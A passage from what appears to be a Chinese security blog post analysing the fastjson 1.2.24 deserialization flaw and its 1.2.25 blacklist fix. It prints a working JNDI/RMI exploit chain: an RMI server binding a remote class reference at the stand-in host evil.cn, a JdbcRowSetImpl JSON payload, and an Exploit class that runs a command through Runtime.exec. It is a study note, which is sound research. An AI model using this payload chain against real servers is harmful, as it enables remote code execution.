+<p>根据前面的分析，TemplatesImpl 中的必要属性已经初始化好了，在调用 getOutputProperties() 方法时，则会触发漏洞。</p>
+<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/fastjson_v1224/16.png" alt="16"></p>
+<h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>在 1.2.23 中加载 @type 指定的类是通过 TypeUtils 的 loadClass() 方法。</p>
+<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/fastjson_v1224/17.png" alt="17"></p>
+<p>其中并没有对类名进行检测。后续的 ParserConfig 的 getDeserializer() 方法中，在调用 createJavaBeanDeserializer() 之前进行了一个简单的检查。</p>
+<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/fastjson_v1224/18.png" alt="18"></p>
+<p>在 1.2.25 中，加载 @type 指定类的方法变为 ParserConfig 的 checkAutoType() 方法。</p>
+<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/fastjson_v1224/19.png" alt="19"></p>
+<p>其中会对类名进行黑名单检查。</p>
+<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/fastjson_v1224/20.png" alt="20"></p>
+<p>并且在 1.2.25 中，取消了 1.2.23 原先的检查位置。</p>
+<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/fastjson_v1224/21.png" alt="21"></p>
+<h2 id="JNDI-注入"><a href="#JNDI-注入" class="headerlink" title="JNDI 注入"></a>JNDI 注入</h2><p>更新于 2019.11.6。</p>
+<p>JNDI，即 Java Naming and Directory Interface，Java 命名与目录接口。我们可以通过 JNDI 提供的统一外部接口去访问其他服务，这里可以结合 RMI 去减少 fastjson 这个漏洞利用的限制。</p>
+<p>RMI 相关知识可以参考：<code>http://llfam.cn/2019/08/20/java_序列化与_rmi/</code></p>
+<p>当把 JNDI Reference 注册到 RMI Registry 时，客户端在通过 lookup() 方法请求 stub 时，会去加载 Reference 指定的远程类，并初始化该类的一个实例。所以，我们只要将客户端的 lookup() 方法的参数指向我们的 RMI 服务，并在该服务上注册一个指向远程恶意类的 Reference，客户端会加载 Reference 指向的类，并初始化加载的类，我们将利用代码放到该类的构造方法中即可实现利用。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">Reference reference = <span class="keyword">new</span> javax.naming.Reference(<span class="string">"Exploit"</span>, <span class="string">"Exploit"</span>, <span class="string">"http://evil.cn/"</span>);</span><br><span class="line">ReferenceWrapper referenceWrapper = <span class="keyword">new</span> com.sun.jndi.rmi.registry.ReferenceWrapper(reference);</span><br><span class="line">registry.bind(<span class="string">"llfam"</span>, referenceWrapper);</span><br></pre></td></tr></table></figure>
+
+<p>上面的代码运行在攻击者的服务器上，在 1099 上创建了一个 RMI Registry，并将一个 Reference 对象绑定到该 RMI 服务上。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Hashtable env = <span class="keyword">new</span> Hashtable();</span><br><span class="line">env.put(Context.INITIAL_CONTEXT_FACTORY,</span><br><span class="line">        <span class="string">"com.sun.jndi.rmi.registry.RegistryContextFactory"</span>);</span><br><span class="line">env.put(Context.PROVIDER_URL,</span><br><span class="line">       	<span class="string">"rmi://localhost:1099"</span>);</span><br><span class="line">Context ctx = <span class="keyword">new</span> InitialContext(env);</span><br><span class="line">Object obj = ctx.lookup(<span class="string">"rmi://evil.cn/llfam"</span>);</span><br></pre></td></tr></table></figure>
+
+<p>这里是模拟客户端代码，将客户端的 lookup() 方法的参数指向攻击者的 RMI 服务。通过 llfam 找到了一个 Reference 对象，客户端会去加载 Reference 指定的文件 <code>http://evil.cn/Exploit.class</code>，并初始化加载到的 Exploit 类，其构造方法会被执行。</p>
+<p>poc</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://localhost:1099/llfam&quot;,&quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure>
+
+<p>poc 利用的是 JdbcRowSetImpl 类。dataSource 是父类 BaseRowSet 的私有属性，但是因为有对应的 setDataSourceName() 方法为该属性初始化，所以该 poc 不需要开启 fastjson 的 SupportNonPublic 选项。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setDataSourceName</span><span class="params">(String name)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (name == <span class="keyword">null</span>) &#123;</span><br><span class="line">        dataSource = <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (name.equals(<span class="string">""</span>)) &#123;</span><br><span class="line">       <span class="keyword">throw</span> <span class="keyword">new</span> SQLException(<span class="string">"DataSource name cannot be empty string"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       dataSource = name;</span><br><span class="line">    &#125;</span><br><span class="line">    URL = <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>setAutoCommit() 方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAutoCommit</span><span class="params">(<span class="keyword">boolean</span> var1)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.conn != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.conn.setAutoCommit(var1);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.conn = <span class="keyword">this</span>.connect();</span><br><span class="line">        <span class="keyword">this</span>.conn.setAutoCommit(var1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>connect() 方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> Connection <span class="title">connect</span><span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">this</span>.conn != <span class="keyword">null</span>) &#123;</span><br><span class="line">	    <span class="keyword">return</span> <span class="keyword">this</span>.conn;</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">this</span>.getDataSourceName() != <span class="keyword">null</span>) &#123;</span><br><span class="line">	    <span class="keyword">try</span> &#123;</span><br><span class="line">	        InitialContext var1 = <span class="keyword">new</span> InitialContext();</span><br><span class="line">	        DataSource var2 = (DataSource)var1.lookup(<span class="keyword">this</span>.getDataSourceName());</span><br><span class="line">            ...</span><br></pre></td></tr></table></figure>
+
+<p>可以看到在 connect() 方法中调用的 lookup() 方法的参数我们可控，即 dataSource 属性。</p>
+<p>攻击者服务器上的 RMI 服务。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JNDIServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">start</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Reference reference = <span class="keyword">new</span> Reference(<span class="string">"Exloit"</span>,</span><br><span class="line">                <span class="string">"Exploit"</span>,<span class="string">"http://audit.test/"</span>);</span><br><span class="line">        ReferenceWrapper referenceWrapper = <span class="keyword">new</span> ReferenceWrapper(reference);</span><br><span class="line">        registry.bind(<span class="string">"llfam"</span>, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>生成 Exploit.class，并放到攻击者在 Reference 中指定的 web 服务器上。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">"open /Applications/Calculator.app"</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argv)</span></span>&#123;</span><br><span class="line">        Exploit e = <span class="keyword">new</span> Exploit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>验证 poc。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JdbcRowSetImplPoc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argv)</span></span>&#123;</span><br><span class="line">        testJdbcRowSetImpl();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">testJdbcRowSetImpl</span><span class="params">()</span></span>&#123;</span><br><span class="line">        String payload = <span class="string">"&#123;\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/llfam\","</span> +</span><br><span class="line">                <span class="string">" \"autoCommit\":true&#125;"</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>初始化加载到的 Exploit 类，执行构造方法中的代码。</p>
+<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/fastjson_v1224/22.png" alt="22"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这里只是简单地写了一点调试的分析，当作一个学习笔记。但是，实际上有很多东西可能我没有细讲。因为，我觉得审计不能光看，一定要自己去看代码，调试学习。对于同一个洞，每个人审计调试学到的东西可能是不一样的 : ) </p>
+<p>ref :</p>
+<p><code>https://www.freebuf.com/vuls/178012.html</code></p>
+<p><code>https://mp.weixin.qq.com/s/0a5krhX-V_yCkz-zDN5kGg</code></p>
+<p><code>http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/</code></p>
+<p><code>http://xxlegend.com/2017/12/06/%E5%9F%BA%E4%BA%8EJdbcRowSetImpl%E7%9A%84Fastjson%20RCE%20PoC%E6%9E%84%E9%80%A0%E4%B8%8E%E5%88%86%E6%9E%90/</code></p>
+
+      </div>
+      <div class="post-copyright">
+    <p class="copyright-item">
+      <span>Author: </span>
+      <a href="http://yoursite.com">ll</a>
+    </p>
+    <p class="copyright-item">
+      <span>Link: </span>
+      <a href="http://yoursite.com/2019/11/06/fastjson_1_2_24/">http://yoursite.com/2019/11/06/fastjson_1_2_24/</a>
+    </p>
+    <p class="copyright-item">
+      <span>License: </span><a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>
+    </p>
+  </div>
+      <footer class="post-footer">
+        <div class="post-tags">
+            <a href="/tags/java/">java</a>
+            </div>
+        
+        <nav class="post-nav"><a class="next" href="/2019/10/19/从bytectf再谈tp/">
+        <span class="next-text nav-default">从 bytectf 再谈 tp</span>
+        <span class="prev-text nav-mobile">Next</span>
+        <i class="iconfont icon-right"></i>
+      </a>
+    </nav></footer>
+    </article></div><div class="comments" id="comments"></div></div>
+      </main>
+
+      <footer id="footer" class="footer"><div class="social-links"><a href="mailto:your@email.com" class="iconfont icon-email" title="email"></a>
+        <a href="https://github.com/LLfam" class="iconfont icon-github" title="github"></a>
+        <a href="/atom.xml" class="iconfont icon-rss" title="rss"></a>
+    </div><div class="copyright">
+  <span class="power-by">
+    Powered by <a class="hexo-link" href="https://hexo.io/">Hexo</a>
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    Theme - 
+    <a class="theme-link" href="https://github.com/ahonn/hexo-theme-even">Even</a>
+  </span>
+
+  <span class="copyright-year">&copy;2015 - 2019<span class="heart">
+      <i class="iconfont icon-heart"></i>
+    </span>
+    <span class="author">ll</span>
+  </span>
+</div>
+</footer>
+
+      <div class="back-to-top" id="back-to-top">
+        <i class="iconfont icon-up"></i>
+      </div>
+    </div><script type="text/javascript" src="/lib/jquery/jquery.min.js"></script>
+  <script type="text/javascript" src="/lib/slideout/slideout.js"></script>
+  <script type="text/javascript" src="/lib/fancybox/jquery.fancybox.pack.js"></script>
+  <script type="text/javascript" src="/lib/pjax/jquery.pjax.min.js"></script>
+  <script type="text/javascript" src="/lib/nprogress/nprogress.min.js"></script>
+  <script type="text/javascript" src="/js/src/even.js?v=2.11.0"></script>
+</body>
+</html>
